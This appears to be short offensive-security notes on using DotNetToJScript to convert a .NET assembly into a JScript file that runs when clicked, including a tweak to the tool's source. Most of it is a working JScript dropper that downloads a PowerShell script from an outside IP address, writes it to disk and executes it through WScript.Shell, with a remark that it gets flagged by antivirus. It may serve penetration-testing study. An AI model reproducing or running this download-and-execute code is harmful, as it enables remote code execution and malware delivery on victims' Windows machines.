# How to use DOTNET to JScript

** Usage: DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js **

*** This will make a .js file that if associated with wscript with execute when clicked.  This is not a default setting ***.
*** Seems like everything in Jscript uses ActiveXObject ***

[It is worth mentioning that Jscript supports proxy configuration via the setProxy method.](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29)


<br><br><br><br>



### Configuring DotNetToJscript 

Before moving forward, we first need to comment out the following portion of the Program.cs source code file present under the DotNetToJScript project.  

At line 154, we need to comment out the following if-block.  

<img width="710" height="122" alt="image" src="https://github.com/user-attachments/assets/f0b6156a-0df2-478a-a2b7-34162afbd226" />




#### Basic Jscript runner that will download a file.  Flagged immediately.

``` Jscript

var url = "http://192.168.1.196:4443/run.ps1"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("run.ps1", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("run.ps1");

```
